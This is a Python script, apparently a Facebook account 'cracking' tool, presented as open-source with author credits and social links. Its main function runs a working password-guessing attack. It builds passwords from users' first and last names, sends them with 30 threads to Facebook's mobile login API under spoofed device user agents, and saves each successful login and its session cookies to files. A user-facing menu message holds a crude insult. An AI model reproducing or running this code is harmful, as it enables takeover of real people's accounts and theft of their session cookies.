#coding = utf-8
#This Open-Source Script is Written by DILBER KHAN
#Please Donot Forget to give Credit 
#Whatsapp : +923232706058
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
 
#####################    
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
 
 
try:
	import requests
except ImportError:
	os.system('pip install requests')
 
 
ses = requests.Session()
 
id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []
 
 
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")
 
def line():
	print(52*'-')
def p(x):
	print(x)
 
def logo():
	logo = (f'''\x1b[1;92m

██████  ██ ██      ██████  ███████ ██████  
██   ██ ██ ██      ██   ██ ██      ██   ██ 
██   ██ ██ ██      ██████  █████   ██████  
██   ██ ██ ██      ██   ██ ██      ██   ██ 
██████  ██ ███████ ██████  ███████ ██   ██                                                                                       
╔══════════════════════════════════════╗
║        WELCOME TO DILBER COMMAND     ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] Author     : DILBER KHAN║
║\033[1;97m[+] FACEBOOK   : SARDAR BADSHA        ║          
║\033[1;97m[+] GITHUB     : DILBER-404         ║
║\033[1;97m[+] VERSION    : 1.1                  ║
╚══════════════════════════════════════╝
---------------------------------------------------''')

	p(logo)
 
ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "
 
 
 
ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
 
# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Mozilla/5.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/37.6.2254.134291","Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 YaBrowser/18.4.0.2 (lite) Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1; Philips V377) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-J330F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 YandexSearch/6.45","Mozilla/5.0 (Linux; arm_64; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.139.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; POCOPHONE F1 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 ACHEETAHI/1","Mozilla/5.0 (Linux; Android 9; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 9; TA-1053) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.139.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a46 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/249.0.0.47.118;]","Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 YaBrowser/19.12.1.226.10 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/FBIOS;FBDV/iPad2,4;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.5;FBSS/1;FBID/tablet;FBLC/ru_RU;FBOP/5;FBCR/]","Mozilla/5.0 (Linux; arm_64; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.4.187.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; BKK-L21 Build/HONORBKK-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 YandexSearch/8.00 YandexSearchBrowser/8.00","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.150","Mozilla/5.0 (Linux; Android 8.0.0; HTC 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Nokia 3.1 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1; M3s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/249.0.0.47.118;]","Mozilla/5.0 (Linux; arm; Android 6.0; CRO-U00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.139.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 YaBrowser/17.10.2.145.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; MI PLAY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36 OPR/37.0.2178.41","Mozilla/5.0 (Linux; Android 9; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/72.0.3626.119 Chrome/72.0.3626.119 Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G965F/G965FXXS2BRJ6) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3861.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.4.187.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; MYA-U29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X; Tesseract/1.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 5 MIUI/V9.6.3.0.NDAMIFD)","AndroidDownloadManager/9 (Linux; U; Android 9; LM-X220 Build/PKQ1.190522.001)","Mozilla/5.0 (Linux; Android 8.1.0; 5033D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","AndroidDownloadManager/7.1.1 (Linux; U; Android 7.1.1; BBC100-1 Build/NMF26F)","Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18334","Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22 Build/HONORDUA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchWebView/7.90","Mozilla/5.0 (Linux; Android 8.0.0; SM-J720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.7.1153 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.4; Lenovo TAB 2 A10-70L Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 GSA/9.94.7.16.arm","Mozilla/5.0 (Linux; Android 10; GM1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-T380) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Safari/537.36","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-T830) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36","com.google.GoogleMobile/88.1.0 iPhone/12.4.3 hw/iPhone7_2","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; A7 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.87.15.21.arm","Mozilla/5.0 (Linux; U; Android 9; en-US; Mi A1 Build/PKQ1.180917.001) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/12.13.5.1209 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; Android 9; SM-J530Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.12.6 Chrome/69.0.3497.128 Safari/537.36","Mozilla/5.0 (Linux; Android 5.1; PSP5509DUO Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36 GSA/5.11.35.19.arm","Mozilla/5.0 (Linux; Android 9; BKL-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/87.0.279142407 Mobile/17C54 Safari/604.1","Mozilla/5.0 (Linux; Android 9; SM-A505FM Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.87.15.21.arm64","Mozilla/5.0 (Linux; Android 9; Mi A2 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G970U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; ZB602KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","AndroidDownloadManager/7.0 (Linux; U; Android 7.0; VIE-L29 Build/HUAWEIVIE-L29)","Mozilla/5.0 (Linux; Android 8.1.0; 5033X_EEA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; Alcatel_5044R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.86.14.21.arm64","Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36 GSA/5.10.32.19.arm","Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/88.1.284108841 Mobile/17C54 Safari/604.1","Mozilla/5.0 (Linux; Android 9; SM-A505FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchWebView/7.90","Mozilla/5.0 (Linux; Android 8.0.0; moto e5 Build/OPP27.91-176; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 GSA/8.15.15.21.arm","com.google.GoogleMobile/88.1.0 iPhone/13.2.3 hw/iPhone8_4","Mozilla/5.0 (Linux; Android 5.1; Lenovo P70-A Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.87.15.21.arm","Mozilla/5.0 (Linux; Android 9; Mi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/88.1.284108841 Mobile/17A878 Safari/604.1","Mozilla/5.0 (Linux; Android 4.2.2; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 YaBrowser/18.11.1.1011.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.12.6 Chrome/69.0.3497.128 Safari/537.36","Football Top One 1.0.5 (iPhone; iOS 10.3.1; en_GB)","Football Top One 1.0.5 (iPhone; iOS 12.4.4; en_GB)","Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/88.1.284108841 Mobile/16G130 Safari/604.1","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G611F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.9) Gecko/20100101 Goanna/4.4 Firefox/68.9 PaleMoon/28.8.0","Mozilla/5.0 (Linux; Android 9; SM-A505G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36","CLIPish%20Pro2/1 CFNetwork/1121.2.2 Darwin/19.2.0","Mozilla/5.0 (Linux; Android 9; Mi A2 Lite Build/PKQ1.180917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.79 Mobile Safari/537.36 GSA/10.87.15.21.arm64","Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.86.14.21.arm","Mozilla/5.0 (Linux; Android 4.2.2; SM-T310 Build/JDQ39) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Safari/537.31",])+END
	return ua
 
	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by DILBER Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Subscribe my youtube channel ")
		p(' [3] Join Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://www.youtube.com/@dilberali5529')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/I8VHRhQG6hz0S1OvEUpjbR')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		print('Method 1 working for now USE METHOD 1')
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()
 
	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()
 
	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight Mode Before Start Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)
 
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DILBER] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[DILBER-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/DILBER_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DILBER_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[DILBER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DILBER_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)
 
	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()
 
	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()
 
		exit()
if __name__=="__main__":
	Main().menu()
 
